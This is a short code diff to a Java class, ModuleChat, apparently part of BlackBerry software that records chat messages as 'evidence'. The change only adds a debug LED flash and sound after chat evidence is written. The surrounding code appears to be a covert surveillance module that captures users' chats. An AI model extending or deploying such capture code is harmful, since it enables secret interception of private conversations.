@@ -13,6 +13,7 @@ import java.util.Vector;
 
 import net.rim.device.api.ui.UiApplication;
 import blackberry.Messages;
+import blackberry.Status;
 import blackberry.config.ConfModule;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
@@ -176,7 +177,11 @@ public final class ModuleChat extends BaseModule {
 
         Evidence evidence = new Evidence(EvidenceType.CHAT);
         evidence.atomicWriteOnce(items);
-
+        
+        if(Status.self().wantLight()){
+            Debug.ledFlash(Debug.COLOR_WHITE);
+            Debug.playSoundOk(1);
+        }
     }
 
     public synchronized void addLines(String program, String partecipants,
